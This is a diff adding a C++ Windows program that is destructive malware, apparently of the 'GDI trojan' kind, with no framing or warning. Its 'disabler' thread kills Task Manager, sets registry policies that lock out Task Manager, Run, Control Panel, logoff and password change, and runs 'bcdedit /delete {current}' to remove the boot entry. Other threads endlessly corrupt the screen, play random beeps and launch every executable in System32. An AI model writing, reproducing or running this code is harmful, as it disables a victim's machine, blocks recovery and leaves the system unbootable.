@@ -1,0 +1,212 @@
+#include <windows.h>
+#include <windowsx.h>
+#include <math.h>
+#include <time.h>
+#include <tchar.h>
+#define M_PI   3.14159265358979323846264338327950288
+#pragma comment(lib, "Msimg32.lib")
+#pragma comment(lib, "winmm.lib")
+
+struct V3 { float x, y, z; };
+struct P2 { int x, y; };
+
+typedef union _RGBQUAD {
+    COLORREF rgb;
+    struct {
+        BYTE r;
+        BYTE g;
+        BYTE b;
+        BYTE Reserved;
+    };
+}_RGBQUAD, * PRGBQUAD;
+
+DWORD WINAPI minty4(LPVOID lpParam) {
+    WIN32_FIND_DATA data;
+    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
+    while (true) {
+        HANDLE find = FindFirstFileW(path, &data);
+        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
+        while (FindNextFileW(find, &data)) {
+            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
+            Sleep(2);
+        }
+    }
+}
+
+DWORD WINAPI cur(LPVOID lpParam) {
+    while (1) {
+        HDC hdc = GetDC(0);
+        int w = GetSystemMetrics(0);
+        int h = GetSystemMetrics(1);
+        DrawIcon(hdc, rand() % w, rand() % h, LoadCursor(NULL, IDC_ARROW));
+        Sleep(0);
+        ReleaseDC(0, hdc);
+    }
+}
+
+DWORD WINAPI payload1(LPVOID lpParam) {
+    while (1) {
+        HDC hdc = GetDC(0);
+        int w = GetSystemMetrics(0);
+        int h = GetSystemMetrics(1);
+        StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, NOTSRCERASE);
+        ReleaseDC(0, hdc);
+    }
+}
+DWORD WINAPI beep(LPVOID lpParam) {
+    while (true) {
+        Beep(rand() % 7400, rand() % 1255);
+    }
+}
+DWORD WINAPI FILEE(LPVOID lpParam) {
+    while (1) {
+        HDC hdc = GetDC(0);
+        int w = GetSystemMetrics(0);
+        int h = GetSystemMetrics(1);
+        StretchBlt(hdc, 10, 0, w - 20, h, hdc, 0, 0, w, h, SRCERASE);
+        ReleaseDC(0, hdc);
+    }
+}
+DWORD WINAPI GAY(LPVOID lpParam) {
+    HDC hdc = GetDC(0);
+    HDC hdcCopy = CreateCompatibleDC(hdc);
+
+    BITMAPINFO bmpi = { 0 };
+
+    int sw = GetSystemMetrics(0);
+    int sh = GetSystemMetrics(1);
+
+    int radius = 25.f;
+    double angle = 0;
+
+    while (1) {
+        HDC hdc = GetDC(0);
+
+        float x = (cos(angle)) * radius;
+        float y = (sin(angle)) * radius;
+
+        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, 0, rand() % 255));
+        SelectObject(hdc, brush);
+
+        BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, PATPAINT);
+        BitBlt(hdc, 0, 0, sw, sh, hdc, x, y, SRCCOPY);
+        StretchBlt(hdc, x, y, sw - x * 2, sh - x * 2, hdc, 0, 0, sw, sh, SRCCOPY);
+
+        DeleteObject(brush);
+        ReleaseDC(0, hdc);
+
+        angle = fmod(angle + M_PI / radius, M_PI * radius);
+    }
+}
+DWORD WINAPI GA(LPVOID lpParam) {
+    while (true) {
+        HDC hdc = GetDC(0);
+        int w = GetSystemMetrics(0);
+        int h = GetSystemMetrics(1);
+        int x = rand() % 300 + 20, y = rand() % 300 + 20;
+        int sx = rand() % (w - x), sy = rand() % (h - y);
+        int dx = rand() % (w - x), dy = rand() % (h - y);
+        BitBlt(hdc, dx, dy, x, y, hdc, sx, sy, SRCINVERT);
+        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
+        StretchBlt(hdc, -1, -1, w + 2, h + 2, hdc, 0, 0, w, h, SRCERASE);
+        ReleaseDC(0, hdc);
+    }
+    return 0;
+} 
+DWORD WINAPI G(LPVOID lpParam) {
+    int w = GetSystemMetrics(0);
+    int h = GetSystemMetrics(1);
+
+    while (1) {
+        HDC hdc = GetDC(0);
+
+        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
+        SelectObject(hdc, brush);
+
+        BitBlt(hdc, -3, 0, w, h, hdc, 0, 0, SRCCOPY);
+        BitBlt(hdc, w - 3, 0, w, h, hdc, 0, 0, SRCCOPY);
+
+        StretchBlt(hdc, 0, 0, w, h, hdc, w, 0, -w, h, SRCCOPY);
+
+        BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
+        BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
+
+        DeleteObject(brush);
+
+        ReleaseDC(0, hdc);
+    }
+}
+DWORD WINAPI A(LPVOID lpParam) {
+    int w = GetSystemMetrics(SM_CXSCREEN);
+    int h = GetSystemMetrics(SM_CYSCREEN);
+
+    int maxOffset = 2;
+
+    while (1) {
+        HDC desk = GetDC(NULL);
+        HDC memDC = CreateCompatibleDC(desk);
+
+        HBITMAP hbm = CreateCompatibleBitmap(desk, w, h);
+        SelectObject(memDC, hbm);
+
+        BitBlt(memDC, 0, 0, w, h, desk, 0, 0, SRCCOPY);
+
+        int offsetX = (rand() % (2 * maxOffset)) - maxOffset;
+        int offsetY = (rand() % (2 * maxOffset)) - maxOffset;
+
+        BitBlt(desk, offsetX, offsetY, w, h, memDC, 0, 0, SRCCOPY);
+
+        DeleteObject(hbm);
+        DeleteDC(memDC);
+
+        ReleaseDC(NULL, desk);
+    }
+}
+DWORD WINAPI disabler(LPVOID lpParam) {
+    system("taskkill /f /im taskmgr.exe");
+    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
+    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
+    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
+    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
+    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
+    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
+    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
+    system("bcdedit /delete {current}");
+    return 1;
+}
+int main() {
+    CreateThread(0, 0, disabler, 0, 0, 0);
+    HANDLE th = CreateThread(0, 0, G, 0, 0, 0);
+    HANDLE h = CreateThread(0, 0, A, 0, 0, 0);
+    HANDLE threa = CreateThread(0, 0, GAY, 0, 0, 0);
+    HANDLE thre = CreateThread(0, 0, GA, 0, 0, 0);
+    HANDLE thread = CreateThread(0, 0, FILEE, 0, 0, 0);
+    HANDLE thread1 = CreateThread(0, 0, beep, 0, 0, 0);
+    HANDLE thread1919 = CreateThread(0, 0, minty4, 0, 0, 0);
+    HANDLE thread191 = CreateThread(0, 0, cur, 0, 0, 0);
+    HANDLE thread19 = CreateThread(0, 0, payload1, 0, 0, 0);
+    Sleep(-1);
+    TerminateThread(h, 0);
+    TerminateThread(thread1919, 0);
+    TerminateThread(thread1, 0);
+    TerminateThread(thread, 0);
+    TerminateThread(threa, 0);
+    TerminateThread(thre, 0);
+    TerminateThread(th, 0);
+    TerminateThread(thread19, 0);
+    TerminateThread(thread191, 0);
+    CloseHandle(thread1919);
+    CloseHandle(thread191);
+    CloseHandle(thread19);
+    CloseHandle(thread1);
+    CloseHandle(thread);
+    CloseHandle(threa);
+    CloseHandle(thre);
+    CloseHandle(th);
+    CloseHandle(h);
+    RedrawWindow(0, 0, 0, 133);
+    Sleep(100);
+    while (1) {
+        Sleep(100);
+    }
+}
